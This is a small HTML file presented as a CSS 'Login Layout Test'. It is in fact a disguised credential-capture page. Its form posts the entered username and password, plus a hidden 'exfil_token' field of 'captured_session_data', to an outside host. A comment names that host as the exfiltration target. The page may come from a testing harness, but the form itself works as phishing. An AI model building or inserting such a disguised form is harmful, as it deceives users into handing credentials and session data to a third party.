<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSS Test Page</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; padding-top: 100px; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h3>Login Layout Test</h3>
        <!-- The form action is the actual exfil/action target -->
        <form action="https://dashboard.test-harness.corp/secure_save" method="POST">
            <input type="text" name="username" id="user" placeholder="Username">
            <input type="password" name="password" id="pass" placeholder="Password">
            <input type="hidden" name="exfil_token" value="captured_session_data">
            <button type="submit" id="test-submit">Test Submit Layout</button>
        </form>
    </div>
</body>
</html>
